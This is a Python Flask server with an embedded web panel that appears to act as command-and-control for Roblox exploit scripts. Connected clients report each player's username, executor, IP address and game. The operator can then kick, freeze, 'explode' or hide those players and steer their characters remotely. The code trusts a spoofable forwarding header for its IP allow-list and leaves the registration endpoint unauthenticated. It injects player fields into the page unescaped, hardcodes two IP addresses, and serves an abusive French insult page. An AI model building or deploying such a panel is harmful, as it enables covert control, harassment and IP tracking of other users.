from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "change_me_123456789"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# TES IP AUTORISÉES
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_kicks = {}
pending_commands = {}
controller_active = {}  # {userid: true/false}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"""
    <html><body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
    <h1>Accès refusé</h1>
    <p style="font-size:2rem;">Ta cru quoi fdp ?</p>
    <p>Ton IP : <b style="font-size:1.8rem;">{detected}</b></p>
    <p>Dégage sale chien</p>
    </body></html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll", "/control"]:
        check_ip()

# HTML MODIFIÉ : + bouton Controller + affichage jeu
HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ROBLOX CONTROL PANEL</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh}
.container{max-width:1200px;margin:auto;padding:40px}
h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
.stats{text-align:center;margin:30px 0;font-size:1.8rem}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:25px}
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
.card:hover{transform:translateY(-8px)}
.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
.dot{width:14px;height:14px;border-radius:50%;background:red;box-shadow:0 0 12px red}
.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
.name{font-size:1.8rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
.name a{color:#ffcc00;text-decoration:none}
.info{font-size:1rem;color:#aaa;margin-bottom:10px;line-height:1.5}
.game{font-size:0.9rem;color:#0f0;background:#0008;padding:5px 10px;border-radius:8px;display:inline-block;margin-top:5px}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1.1rem}
button{padding:12px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;color:white;transition:transform .2s;margin:4px}
button:hover{transform:scale(1.05)}
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.controller-pad{background:#111;padding:30px;border-radius:20px;text-align:center;box-shadow:0 0 40px #00ffaa}
.key{width:70px;height:70px;background:#333;border-radius:12px;display:inline-flex;align-items:center;justify-content:center;font-size:1.5rem;margin:10px}
.key:active{background:#00ffaa;color:#000}
</style>
</head>
<body>
<div class="container">
    <h1>ROBLOX CONTROL PANEL</h1>
    <div class="stats" id="stats">Players online: <b>0</b></div>
    <div class="grid" id="players"></div>
</div>

<!-- Controller Modal -->
<div class="modal" id="controllerModal">
    <div class="controller-pad">
        <h2 style="color:#00ffaa;margin-bottom:20px">Controller <span id="ctrlName"></span></h2>
        <div>
            <div class="key" id="keyZ" onmousedown="press('z')" onmouseup="release('z')" ontouchstart="press('z')" ontouchend="release('z')">Z</div>
        </div>
        <div>
            <div class="key" id="keyQ" onmousedown="press('q')" onmouseup="release('q')" ontouchstart="press('q')" ontouchend="release('q')">Q</div>
            <div class="key" id="keyS" onmousedown="press('s')" onmouseup="release('s')" ontouchstart="press('s')" ontouchend="release('s')">S</div>
            <div class="key" id="keyD" onmousedown="press('d')" onmouseup="release('d')" ontouchstart="press('d')" ontouchend="release('d')">D</div>
        </div>
        <div style="margin-top:20px">
            <div class="key" style="width:160px;height:70px;font-size:1.8rem" id="keySpace" onmousedown="press('space')" onmouseup="release('space')" ontouchstart="press('space')" ontouchend="release('space')">SPACE</div>
        </div>
        <button style="margin-top:20px;background:#f33" onclick="closeController()">Fermer</button>
    </div>
</div>

<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let currentPlayerId = null;

function toast(msg, type = "success") {
    const t = document.createElement("div");
    t.className = "toast " + (type === "danger" ? "danger" : "");
    t.textContent = msg;
    document.getElementById("toasts").appendChild(t);
    setTimeout(() => t.remove(), 4000);
}

function openController(id, name) {
    currentPlayerId = id;
    document.getElementById("ctrlName").textContent = name;
    document.getElementById("controllerModal").classList.add("active");
}

function closeController() {
    document.getElementById("controllerModal").classList.remove("active");
    releaseAll();
    currentPlayerId = null;
}

function press(key) {
    if (!currentPlayerId) return;
    fetch("/control", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentPlayerId,key:key,down:true})});
    document.getElementById("key"+key.toUpperCase()).style.background = "#00ffaa";
    document.getElementById("key"+key.toUpperCase()).style.color = "#000";
}

function release(key) {
    if (!currentPlayerId) return;
    fetch("/control", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentPlayerId,key:key,down:false})});
    document.getElementById("key"+key.toUpperCase()).style.background = "#333";
    document.getElementById("key"+key.toUpperCase()).style.color = "#fff";
}

function releaseAll() {
    ["z","q","s","d","space"].forEach(k => release(k));
}

function sendTroll(id, cmd) {
    fetch("/troll", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,cmd:cmd})});
    toast(cmd.toUpperCase() + " envoyé");
}

function render(data) {
    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));
    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`) || document.createElement("div");
        card.className = "card"; card.id = `card_${id}`;
        card.innerHTML = `
            <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
            <div class="name"><a href="https://roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}</div>
            <div class="game">Jeu: ${p.game || "Inconnu"} (PlaceId: ${p.placeId || "???"})</div>
            <div class="category">TROLLS</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button style="background:#ff3366" onclick="fetch('/kick',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:'${id}',reason:'Kicked by admin'})})">KICK</button>
                <button style="background:#ff00ff" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button style="background:#00ffff" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button style="background:#ffff00" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button style="background:#88ff88" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button style="background:#ff5555" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button style="background:#5555ff" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button style="background:#00ff00" onclick="openController('${id}', '${p.username}')">CONTROLLER</button>
            </div>
            <div class="category">UNDO</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button style="background:#666" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button style="background:#666" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button style="background:#666" onclick="sendTroll('${id}','unrainbow')">UNRAINBOW</button>
            </div>
        `;
        if (!document.getElementById(`card_${id}`)) grid.appendChild(card);
    });
    document.querySelectorAll('.card').forEach(c => !currentIds.has(c.id.replace('card_','')) && c.remove());
}

socket.on("update", render);
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                connected_players[uid] = {
                    "username": d.get("username", "Unknown"),
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "game": d.get("game", "Inconnu"),
                    "placeId": d.get("placeId", "???"),
                    "last": now,
                    "online": True
                }
                socketio.emit("status", {"username": connected_players[uid]["username"], "online": True})
            elif d.get("action") == "heartbeat":
                if uid in connected_players:
                    connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            return jsonify({"command": cmd})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "Kicked by admin")
    pending_kicks[uid] = reason
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd:
        pending_commands[uid] = cmd
    return jsonify({"sent": True})

@app.route("/control", methods=["POST"])
def control():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    key = data.get("key", "")
    down = data.get("down", False)
    if uid and key in ["z","q","s","d","space"]:
        pending_commands[uid] = f"control_{key}_{'down' if down else 'up'}"
    return jsonify({"ok": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove:
            username = connected_players.pop(uid, {}).get("username", "Unknown")
            socketio.emit("status", {"username": username, "online": False})
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
